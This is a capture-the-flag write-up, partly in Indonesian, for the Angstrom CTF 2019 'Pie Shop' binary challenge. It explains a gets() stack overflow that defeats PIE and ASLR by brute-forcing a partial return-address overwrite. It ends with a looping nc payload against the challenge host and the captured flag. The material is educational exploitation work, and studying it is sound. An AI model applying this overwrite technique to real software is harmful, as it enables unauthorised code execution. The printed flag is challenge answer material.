# __Angstrom CTF 2019__ 
## _Pie Shop_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary | 100 | l0l

**Description:** 

> 100 points 49 solves
>
> nc shell.actf.co 19306
>
> Author: Aplet123
>
> Given : [binary](./pie_shop) and [source](./pie_shop.c)

**Hints**
> What does it mean if PIE is enabled on a binary?
>
> 20 bits is not that much.

### Pie Shop
```
pie_shop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9318df53faeaad841153110c8ded995df882498b, not stripped

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
Cek di server, ASLR enabled.

```
gdb-peda$ info func
...
0x00000000000011a9  flag
0x00000000000011bc  get_pie
0x0000000000001262  main
...
```

### Pie Shop Source Code
```c
void flag() {
	system("/bin/cat flag.txt");
}

void get_pie() {
...
	char pie[50];
	gets(pie);
...
}

int main() {
...
	get_pie();
...
}
```

### Solve
Disini proteksi PIE ditambah dengan ASLR membuat kita tidak bisa secara langsung menentukan address fungsi `flag`. Ditambah setiap input kita ditambah `NULL BYTE` di akhirnya.

Sebelum input : 
```
gdb-peda$ x/2gx $rsp
0x7fffffffe4a0: 0x00000000000000a0      0x00007ffff7f9b5c0
```

Setelah input 'AAAABBBBC':
```
gdb-peda$ x/2gx $rsp
0x7fffffffe4a0: 0x4242424241414141      0x00007ffff7f90043
```

Terlihat ada null byte yang ditambahkan setelah 0x43 ('C'). Karena kita tahu bahwa address akhir dari fungsi flag adalah 0x1a9, kita bisa bruteforce return address, mengganti 3 byte terakhirnya dengan 0x00`x`1a9 (x bisa berapapun) dan menunggu sampai address kita benar. 0x00 di awal karena input kita ditambah dengan null byte.

Padding 0x40+8bytes.

### Payload
```bash
while true
do
python2 -c "print 'A'*0x40+'B'*8+'\xa9\x11'" | nc shell.actf.co 19306 | grep actf
done
```

### Flag 
actf{a_different_kind_of_pie}
